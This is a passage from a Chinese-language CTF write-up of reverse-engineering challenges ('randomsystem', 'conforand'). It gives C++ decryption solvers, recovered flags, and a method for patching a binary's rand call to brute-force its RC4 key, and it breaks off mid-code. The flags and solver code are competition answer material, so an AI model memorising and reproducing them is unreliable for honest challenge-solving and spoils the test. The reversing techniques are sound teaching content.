class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0xAB</span>, <span class="number">0xF2</span>, <span class="number">0x72</span>, <span class="number">0x9F</span>, <span class="number">0x18</span>, <span class="number">0x17</span>&#125;;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0x7e8</span>);</span><br><span class="line">    <span class="comment">// 初始化Key</span></span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">4</span>]&#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">        key[i] = <span class="built_in">rand</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">7</span>; j &gt; <span class="number">0</span>; j--)</span><br><span class="line">        <span class="built_in">dec</span>(<span class="number">0x9E3779B9</span>, (<span class="type">unsigned</span> <span class="type">int</span> *)(buffer + (j - <span class="number">1</span>) * <span class="number">4</span>), (<span class="type">unsigned</span> <span class="type">int</span> *)(buffer + j * <span class="number">4</span>), (<span class="type">uint32_t</span>)key);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 四个字节一组进行翻转</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> tmp = *((<span class="type">char</span> *)buffer + j + <span class="number">3</span>) | (*((<span class="type">char</span> *)buffer + j + <span class="number">2</span>) &lt;&lt; <span class="number">8</span>) | (*((<span class="type">char</span> *)buffer + j + <span class="number">1</span>) &lt;&lt; <span class="number">16</span>) | (*((<span class="type">char</span> *)buffer + j) &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        *(<span class="type">int</span> *)(buffer + j) = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, buffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HZNUCTF{ae6-9f57-4b74-b423-98eb}</p><h2 id="randomsystem"><a href="#randomsystem" class="headerlink" title="randomsystem"></a>randomsystem</h2><p>第一部分是输入 64 字节大小的 0101 二进制数据，然后进行转换到 Hex（倒序），再倒序回来拆分半个字节转到 ascii 字符。</p><p>如：0101001001100101 第一次函数后是 0x65，0x52 然后再翻转拆分为 ascii 字符’5’,’2’,’6’,’5’。</p><p><img src="/2025/04/13/TGCTF2025/TxRSbtlaOoGfE9xuGS8chr7snuc.png"></p><p>根据判断判断出的字符可知要输入的是 52 65 56 65 52 65 53 65 的二进制数据。</p><p><code>0101001001100101010101100110010101010010011001010101001101100101</code></p><p>底下的一些加密函数里面有花指令，是基础花指令，这边不做多赘述。</p><p>第一部分用固定种子的随机数初始化了一个 v18 数值列表。</p><p><img src="/2025/04/13/TGCTF2025/E57zbT7UAouWIoxT4qbcAgg8nLg.png"></p><p>然后进行四次加密。</p><p><img src="/2025/04/13/TGCTF2025/U8vVbo1XroTRa3x38f2cevkEndh.png"></p><p>Enc1 是用随机数初始化的列表进行打乱输入字符串的顺序。</p><p><img src="/2025/04/13/TGCTF2025/F2GsbyGsLoVzmTxG1zzcg2h0nlb.png"></p><p>Enc2 是将输入字符串转存到另一个二维数组。</p><p><img src="/2025/04/13/TGCTF2025/SSyIbLzGao8Nbmx7pcNckZyhnpd.png"></p><p>第三个函数是将之前输入转换后的 Key 存到”Str”中，实际值就是 <strong>ReVeReSe</strong></p><p>第四个函数是用一个全局的矩阵乘上输入数据。</p><p><img src="/2025/04/13/TGCTF2025/LZg4btpJ4odkaRxmWcrco0OTngf.png"></p><p>最后和 Key 进行循环异或加密。</p><p><img src="/2025/04/13/TGCTF2025/JLNAbr3vIo0mX6xHpmZct8gmnth.png"></p><p>所以解密流程就是这几步的翻转，需要先计算出全局矩阵数据的逆矩阵，这一步用在线网站就可以解得。</p><p>Enc1 由于是对称的可以直接用原函数，Enc3 也可以直接用原函数把矩阵数据改成逆矩阵就是解密。</p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Enc1</span><span class="params">(<span class="type">char</span> *_Str_, <span class="type">int</span> *_RdList_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> v3;   <span class="comment">// [esp+D3h] [ebp-1Dh]</span></span><br><span class="line">    <span class="type">size_t</span> i;  <span class="comment">// [esp+DCh] [ebp-14h]</span></span><br><span class="line">    <span class="type">size_t</span> v5; <span class="comment">// [esp+E8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">    v5 = <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> result = v5 &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= v5 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (_RdList_[i] &gt;= <span class="number">0</span> &amp;&amp; _RdList_[i] &lt; v5)</span><br><span class="line">        &#123;</span><br><span class="line">            v3 = _Str_[i];</span><br><span class="line">            _Str_[i] = _Str_[v5 - _RdList_[i] - <span class="number">1</span>];</span><br><span class="line">            _Str_[v5 - _RdList_[i] - <span class="number">1</span>] = v3;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Enc2</span><span class="params">(<span class="type">char</span> *_a1_, <span class="type">char</span> *_a2_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> j;  <span class="comment">// [esp+D0h] [ebp-20h]</span></span><br><span class="line">    <span class="type">int</span> i;  <span class="comment">// [esp+DCh] [ebp-14h]</span></span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// [esp+E8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j)</span><br><span class="line">            *&amp;_a1_[<span class="number">32</span> * i + <span class="number">4</span> * j] = _a2_[v4++];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> dword_3FC368[] = &#123;</span><br><span class="line">    <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> inv[] = &#123;</span><br><span class="line">    <span class="number">1</span>,<span class="number">-4</span>,<span class="number">1</span>,<span class="number">-2</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">-2</span>,<span class="number">3</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">3</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-3</span>,<span class="number">1</span>,<span class="number">-2</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">-2</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">-1</span>,<span class="number">2</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">-4</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">-2</span>,<span class="number">3</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Enc3</span><span class="params">(<span class="type">int</span> *_a1_, <span class="type">char</span> *_a2_, <span class="type">char</span> *_a3_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> k;      <span class="comment">// [esp+D0h] [ebp-20h]</span></span><br><span class="line">    <span class="type">int</span> j;      <span class="comment">// [esp+DCh] [ebp-14h]</span></span><br><span class="line">    <span class="type">int</span> i;      <span class="comment">// [esp+E8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            _a3_[<span class="number">32</span> * i + <span class="number">4</span> * j] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">8</span>; ++k)</span><br><span class="line">                _a3_[<span class="number">32</span> * i + <span class="number">4</span> * j] += *&amp;_a2_[<span class="number">32</span> * k + <span class="number">4</span> * j] * _a1_[<span class="number">8</span> * i + k];</span><br><span class="line">        &#125;</span><br><span class="line">        result = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dec2</span><span class="params">(<span class="type">char</span> *_a1_, <span class="type">char</span> *_a2_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> v4;</span><br><span class="line"></span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j)</span><br><span class="line">            _a2_[v4++] = _a1_[<span class="number">32</span> * i + <span class="number">4</span> * j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> EncFlag[<span class="number">256</span>] = &#123;</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x64</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF5</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x15</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x7C</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x7D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x5B</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x33</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x07</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x67</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x36</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x5A</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x96</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xAF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x9E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFA</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xAF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x9E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xAD</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x98</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7B</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x9E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x82</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xC5</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC5</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xCF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xCA</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xCC</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xB0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xC1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x9E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xB5</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x91</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x99</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x97</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// First: 0101001001100101010101100110010101010010011001010101001101100101</span></span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">2025</span>);</span><br><span class="line">    <span class="type">int</span> RdList[<span class="number">0x80</span>]&#123;&#125;;</span><br><span class="line">    <span class="type">bool</span> v16 = <span class="literal">true</span>;</span><br><span class="line">    <span class="type">int</span> rd&#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            rd = <span class="built_in">rand</span>() % <span class="number">32</span>;</span><br><span class="line">            rd &amp;= <span class="number">0x8000001F</span>;</span><br><span class="line">            v16 = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (RdList[j] == rd)</span><br><span class="line">                &#123;</span><br><span class="line">                    v16 = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (!v16);</span><br><span class="line">        RdList[i] = rd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> Key[] = <span class="string">&quot;ReVeReSe&quot;</span>;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *(DWORD *)(EncFlag + i) ^= Key[count % <span class="number">8</span>];</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Buffer_Dec[<span class="number">256</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Enc3</span>((<span class="type">int</span> *)inv, (<span class="type">char</span> *)EncFlag, (<span class="type">char</span> *)Buffer_Dec);</span><br><span class="line">    <span class="built_in">Dec2</span>((<span class="type">char</span> *)Buffer_Dec, (<span class="type">char</span> *)Buffer_Dec);</span><br><span class="line">    <span class="built_in">Enc1</span>((<span class="type">char</span> *)Buffer_Dec, RdList);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;HZNUCTF&#123;%.64s&#125;\n&quot;</span>, Buffer_Dec);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HZNUCTF{3zfb899ac5c256d-7a8r59f0tccd-4fa6b8vfd111-a44ffy4r0-6dce5679da58}</p><h2 id="conforand（非预期）"><a href="#conforand（非预期）" class="headerlink" title="conforand（非预期）"></a>conforand（非预期）</h2><p>从 srand 查看交叉调用，发现是当前时间戳随机，并非伪随机。</p><p><img src="/2025/04/13/TGCTF2025/JO8jbueEjoxwK9xUkGbc8SnBnnd.png"></p><p><img src="/2025/04/13/TGCTF2025/Ke3Gb4w0joy30qxDc4rcyhnHnve.png"></p><p>查看 rand 交叉调用，发现是再 init_sbox 函数中调用，并且只获取了一次随机数，应该是利用 rand 的数值参与 sbox 生成。</p><p><img src="/2025/04/13/TGCTF2025/WjGibCMxVoBZZXx1SGNcADoTnQH.png"></p><p>那么这边的思路就是爆破随机数，但由于是 ollvm 编译的，代码混乱，使用 d810 去混淆后也是很混乱，这边就直接不分析加密代码，采取黑盒爆破手段。</p><p>接下来是先检验加密对称性，运行发现是会输出加密后的内容。</p><p>检验步骤：</p><ol><li>随便输入一串字符串</li><li>断点 rand，修改 rand 返回值 rax 寄存器为 0。</li><li>得到输出加密内容。</li><li>再次输入字符串，断点在 main 的 rc4 调用处，将传参的字符串 patch 为刚刚程序输出的加密后字节数据。</li><li>断点 rand，修改 rand 返回值 rax 寄存器为 0。</li><li>观察输出加密内容是否为原字符串数据。</li></ol><p>Patch 前：</p><p><img src="/2025/04/13/TGCTF2025/HTtrb5ro4oKqJmxBK8Sc3IDqncb.png"></p><p>Patch 后：</p><p><img src="/2025/04/13/TGCTF2025/ThFobqnWJo9RzvxZFakcsSOdn0b.png"></p><p>发现是对称的，同一个 rand 值，加密函数也可以用于解密。</p><p><img src="/2025/04/13/TGCTF2025/RhCobLCqyo4yMKxnDXnc0oXenGb.png"></p><p><img src="/2025/04/13/TGCTF2025/ZOlWb1F05oujnjxbU6EcLE9snmh.png"></p><p>开始 Patch 原程序流程，用于爆破，将 init 函数作为 hook 跳转函数。</p><p>将 rand 调用改成 jmp 到 init 函数。</p><p><img src="/2025/04/13/TGCTF2025/L5lObHqpPo4BJlxHSL0cU3jfnhg.png"></p><p>init 函数头直接改成如下，将 0x4068D3 地址的数值存到 eax，然后再跳转回去，达到一个 hook 修改 rand 值结果的效果，所以我们直接加载 elf 通过修改 0x4068D3 数值，调用 rc4 加密来爆破解密密文。</p><p><img src="/2025/04/13/TGCTF2025/Z8d6bu82ToEbmJxAv18cRqsZnZd.png"></p><p>这边使用这个库加载 elf 进行调用 call：<a href="https://github.com/IchildYu/load-elf">https://github.com/IchildYu/load-elf</a> （河豚鱼，神）</p><p>爆破代码（Key 是在原 init 函数中进行初始化的明文，可以直接找到）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 